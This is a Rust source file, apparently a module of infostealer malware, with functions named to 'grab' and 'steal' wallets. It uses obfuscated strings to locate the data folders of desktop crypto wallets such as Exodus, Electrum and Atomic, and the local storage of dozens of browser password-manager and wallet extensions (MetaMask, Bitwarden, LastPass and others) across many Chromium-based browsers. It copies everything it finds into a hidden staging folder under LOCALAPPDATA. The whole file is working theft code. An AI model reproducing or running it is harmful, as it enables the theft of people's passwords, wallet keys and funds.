use crate::chromium::dumper::Dumper;
use app_dirs::get_app_dir;
use app_dirs::AppDataType;
use std::collections::HashMap;
use walkdir::WalkDir;

pub fn grab_cold_wallets() {
    let mut hm: HashMap<String, String> = HashMap::new();
    hm.insert(
        obfstr::obfstr!("AtomicWallet").to_string(),
        obfstr::obfstr!("%APPDATA%\\atomic\\Local Storage\\leveldb\\").to_string(),
    );
    hm.insert(obfstr::obfstr!("Exodus").to_string(), obfstr::obfstr!("%APPDATA%\\exodus\\exodus.wallet\\").to_string());
    hm.insert(
        obfstr::obfstr!("JaxxWallet").to_string(),
        obfstr::obfstr!("%APPDATA%\\Wallets\\Jaxx\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\").to_string());
    hm.insert(obfstr::obfstr!("Electrum").to_string(), obfstr::obfstr!("%APPDATA%\\Electrum\\wallets\\").to_string());
    hm.insert(obfstr::obfstr!("ByteCoin").to_string(), obfstr::obfstr!("%APPDATA%\\bytecoin\\").to_string());
    hm.insert(obfstr::obfstr!("Ethereum").to_string(), obfstr::obfstr!("%APPDATA%\\Ethereum\\keystore\\").to_string());
    hm.insert(obfstr::obfstr!("Guarda").to_string(), obfstr::obfstr!("%APPDATA%\\Guarda\\\\Local Storage\\leveldb\\").to_string());
    hm.insert(obfstr::obfstr!("Coinomi").to_string(), obfstr::obfstr!("%APPDATA%\\Coinomi\\Coinomi\\wallets\\").to_string());
    hm.insert(obfstr::obfstr!("Armory").to_string(), obfstr::obfstr!("%APPDATA%\\Armory\\").to_string());
    hm.insert(obfstr::obfstr!("ZCash").to_string(), obfstr::obfstr!("%APPDATA%\\Zcash\\").to_string());

    for (key, value) in hm.iter() {
        let string_path = value.replace("%APPDATA%", &std::env::var("APPDATA").unwrap());
        let path = std::path::Path::new(&string_path);
        if path.exists() {
            unsafe { crate::WALLETS += 1; }

            let _ = std::fs::create_dir(format!(
                "{}\\logscx\\{}\\",
                &std::env::var("LOCALAPPDATA").unwrap(),
                key
            ));

            let walker = WalkDir::new(string_path).into_iter();

            for entry in walker {
                let entry = entry.unwrap();
                let _ = std::fs::copy(
                    entry.path(),
                    format!(
                        "{}\\logscx\\{}\\{}",
                        &std::env::var("LOCALAPPDATA").unwrap(),
                        key,
                        entry.path().file_name().unwrap().to_str().unwrap()
                    ),
                );
            }
        }
    }
}

pub fn steal_browser_wallets() {
    let mut hm = HashMap::new();
    hm.insert("edge", Dumper::new("Edge", "Microsoft"));
    hm.insert("chromium", Dumper::new("", "Chromium"));
    hm.insert("7star", Dumper::new("7Star", "7Star"));
    hm.insert("amigo", Dumper::new("", "Amigo"));
    hm.insert("brave", Dumper::new("Brave-Browser", "BraveSoftware"));
    hm.insert("centbrowser", Dumper::new("", "CentBrowser"));
    hm.insert("chedot", Dumper::new("", "Chedot"));
    hm.insert("chrome_canary", Dumper::new("Chrome SxS", "Google"));
    hm.insert("coccoc", Dumper::new("Browser", "CocCoc"));
    hm.insert("dragon", Dumper::new("Dragon", "Comodo"));
    hm.insert("elements-browser", Dumper::new("", "Elements Browser"));
    hm.insert(
        "epic-privacy-browser",
        Dumper::new("", "Epic Privacy Browser"),
    );
    hm.insert("chrome", Dumper::new("Chrome", "Google"));
    hm.insert("kometa", Dumper::new("", "Kometa"));
    hm.insert("orbitum", Dumper::new("", "Orbitum"));
    hm.insert("sputnik", Dumper::new("Sputnik", "Sputnik"));
    hm.insert("torch", Dumper::new("", "Torch"));
    hm.insert("ucozmedia", Dumper::new("Uran", "uCozMedia"));
    hm.insert("vivaldi", Dumper::new("", "Vivaldi"));
    hm.insert("atom-mailru", Dumper::new("Atom", "Mail.Ru"));
    hm.insert("opera", Dumper::new("Opera Software", "Opera Stable"));
    hm.insert("opera-gx", Dumper::new("Opera Software", "Opera GX Stable"));
    hm.insert("ChromePlus", Dumper::new("MappleStudio", "ChromePlus"));
    hm.insert("Iridium", Dumper::new("Iridium", "Iridium"));
    hm.insert("Iridium", Dumper::new("", "Iridium"));
    hm.insert("fenrir-inc", Dumper::new("sleipnir5", "settings"));
    hm.insert("catalinagroup", Dumper::new("CatalinaGroup", "Citrio"));
    hm.insert("Coowoo", Dumper::new("", "Coowoo"));
    hm.insert("liebao", Dumper::new("", "liebao"));
    hm.insert("qip-surf", Dumper::new("", "Qip Surf"));
    hm.insert("360browser", Dumper::new("360Browser", "Browser"));


    let mut extensions = std::collections::HashMap::new(); 
    extensions.insert("Authenticator",         "bhghoamapcdpbohphigoooaddinpkbai");
   extensions.insert("EOS Authenticator",       "oeljdldpnmdbchonielidgobddffflal");
   extensions.insert("Bitwarden",               "nngceckbapebfimnlniiiahkandclblb");
   extensions.insert("KeePassXC",               "oboonakemofpalcgghocfoadofidjkkk");
   extensions.insert("Dashlane",                "fdjamakpfbbddfjaooikfcpapjohcfmg");
   extensions.insert("1Password",               "aeblfdkhhhdcdjpifhhbdiojplfjncoa");
   extensions.insert("NordPass",                "fooolghllnmhmmndgjiamiiodkpenpbb");
   extensions.insert("Keeper",                  "bfogiafebfohielmmehodmfbbebbbpei");
   extensions.insert("RoboForm",                "pnlccmojcmeohlpggmfnbbiapkmbliob");
   extensions.insert("LastPass",                "hdokiejnpimakedhajhdlcegeplioahd");
   extensions.insert("BrowserPass",             "naepdomgkenhinolocfifgehidddafch");
   extensions.insert("MYKI",                    "bmikpgodpkclnkgmnpphehdgcimmided");
   extensions.insert("Splikity",                "jhfjfclepacoldmjmkmdlmganfaalklb");
   extensions.insert("CommonKey",               "chgfefjpcobfbnpmiokfjjaglahmnded");
   extensions.insert("Zoho Vault",              "igkpcodhieompeloncfnbekccinhapdb");
   extensions.insert("Norton Password Manager", "admmjipmmciaobhojoghlmleefbicajg");
   extensions.insert("Avira Password Manager",  "caljgklbbfbcjjanaijlacgncafpegll");
   extensions.insert("Trezor Password Manager", "imloifkgjagghnncjkhggdhalmcnfklk");    
   extensions.insert("MetaMask",                "nkbihfbeogaeaoehlefnkodbefgpgknn");
   extensions.insert("TronLink",                "ibnejdfjmmkpcnlpebklmnkoeoihofec");
   extensions.insert("BinanceChain",            "fhbohimaelbohpjbbldcngcnapndodjp");
   extensions.insert("Coin98",                  "aeachknmefphepccionboohckonoeemg");
   extensions.insert("iWallet",                 "kncchdigobghenbbaddojjnnaogfppfj");
   extensions.insert("Wombat",                  "amkmjjmmflddogmhpjloimipbofnfjih");
   extensions.insert("MEW CX",                  "nlbmnnijcnlegkjjpcfjclmcfggfefdm");
   extensions.insert("NeoLine",                 "cphhlgmgameodnhkjdmkpanlelnlohao");
   extensions.insert("Terra Station",           "aiifbnbfobpmeekipheeijimdpnlpgpp");
   extensions.insert("Keplr",                   "dmkamcknogkgcdfhhbddcghachkejeap");
   extensions.insert("Sollet",                  "fhmfendgdocmcbmfikdcogofphimnkno");
   extensions.insert("ICONex",                  "flpiciilemghbmfalicajoolhkkenfel");
   extensions.insert("KHC",                     "hcflpincpppdclinealmandijcmnkbgn");
   extensions.insert("TezBox ",                 "mnfifefkajgofkcjkemidiaecocnkjeh");
   extensions.insert("Byone",                   "nlgbhdfgdhgbiamfdfmbikcdghidoadd");
   extensions.insert("OneKey",                  "infeboajgfhgbjpjbeppbkgnabfdkdaf");
   extensions.insert("DAppPlay",                "lodccjjbdhfakaekdiahmedfbieldgik");
   extensions.insert("BitClip",                 "ijmpgkjfkbfhoebgogflfebnmejmfbml");
   extensions.insert("Steem Keychain",          "lkcjlnjfpbikmcmbachjpdbijejflpcm");
   extensions.insert("Nash Extension",          "onofpnbbkehpmmoabgpcpmigafmmnjhl");
   extensions.insert("Hycon Lite Client",       "bcopgchhojmggmffilplmbdicgaihlkp");
   extensions.insert("ZilPay",                  "klnaejjgbibmhlephnhpmaofohgkpgkd");
   extensions.insert("Leaf Wallet",             "cihmoadaighcejopammfbmddcmdekcje");
   extensions.insert("Cyano Wallet",            "dkdedlpgdmmkkfjabffeganieamfklkm");
   extensions.insert("Cyano Wallet Pro",        "icmkfkmjoklfhlfdkkkgpnpldkgdmhoe");
   extensions.insert("Nabox Wallet",            "nknhiehlklippafakaeklbeglecifhad");
   extensions.insert("Polymesh Wallet",         "jojhfeoedkpkglbfimdfabpdfjaoolaf");
   extensions.insert("Nifty Wallet",            "jbdaocneiiinmjbjlgalhcelgbejmnid");
   extensions.insert("Liquality Wallet",        "kpfopkelmapcoipemfendmdcghnegimn");
   extensions.insert("Math Wallet",             "afbcbjpbpfadlkmhmclhkeeodmamcflc");
   extensions.insert("Coinbase Wallet",         "hnfanknocfeofbddgcijnmhnfnkdnaad");
   extensions.insert("Clover Wallet",           "nhnkbkgjikgcigadomkphalanndcapjk");
   extensions.insert("Yoroi",                   "ffnbelfdoeiohenkjibnmadjiehjhajb");
   extensions.insert("Guarda",                  "hpglfhgfnhbgpjdenjgmdgoeiappafln");
   extensions.insert("EQUAL Wallet",            "blnieiiffboillknjnepogjhkgnoapac");
   extensions.insert("BitApp Wallet",           "fihkakfobkmkjojpchpfgcmhfjnmnfpi");
   extensions.insert("Auro Wallet",             "cnmamaachppnkjgnildpdmkaakejnhae");
   extensions.insert("Saturn Wallet",           "nkddgncdjgjfcddamfgcmfnlhccnimig");
   extensions.insert("Ronin Wallet",            "fnjhmkhhmkbjkkabndcnnogagogbneec");
   extensions.insert("Exodus",                  "aholpfdialjgjfhomihkjbmgjidlcdno");
   extensions.insert("Maiar DeFi Wallet",       "dngmlblcodfobpdpecaadgfbcggfjfnm");
   extensions.insert("Nami",                    "lpfcbjknijpeeillifnkikgncikgfhdo");
   extensions.insert("Eternl",                  "kmhcihpebfmpgmihbkipmjlmmioameka");



 
    for (name, dumper) in hm {
        let path = get_app_dir(AppDataType::UserCache, &dumper.app_info, obfstr::obfstr!("User Data/Default/Local Extension Settings/")).unwrap();
        if path.exists() {
            for(extension_name, extension_path) in &extensions {
                let extension_path_str = format!("{}\\{}\\", path.display(), extension_path);
                let extension_path = std::path::Path::new(&extension_path_str);
                if extension_path.exists() {
                    unsafe { crate::WALLETS += 1; }

                    let _ = std::fs::create_dir(format!("{}\\logscx\\{}_{}\\", std::env::var("LOCALAPPDATA").unwrap(), extension_name, name));
                    let walker = WalkDir::new(extension_path_str).into_iter();

                    for entry in walker {
                        let entry = entry.unwrap();
                        let _ = std::fs::copy(
                            entry.path(),
                            format!(
                                "{}\\logscx\\{}_{}\\{}",
                                &std::env::var("LOCALAPPDATA").unwrap(),
                                extension_name,
                                name,
                                entry.path().file_name().unwrap().to_str().unwrap()
                            ),
                        );
                    }
                }
            }

        }
    }
}
